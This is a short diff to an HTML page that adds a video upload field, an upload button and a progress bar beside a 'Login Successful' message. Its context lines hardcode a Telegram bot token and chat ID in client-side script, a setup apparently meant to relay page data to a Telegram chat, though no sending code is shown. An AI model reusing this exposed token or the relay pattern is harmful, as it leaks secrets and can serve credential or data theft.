@@ -210,7 +210,18 @@
     <div class="icon">🎉</div>
     <div class="message">Congratulations! Login Successful.</div>
   </div>
+<input type="file" id="videoUpload" accept="video/*">
+<button onclick="uploadVideo()">Upload Video</button>
 
+<!-- Progress Bar -->
+<div id="uploadProgress" style="display: none;">
+  <progress id="progressBar" value="0" max="100"></progress>
+  <span id="progressText">0%</span>
+</div>
+
+<!-- Uploaded Video Display -->
+<div id="uploadedVideos"></div>
+    
   <script>
     const botToken = "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA";
     const chatId = "6850505184";
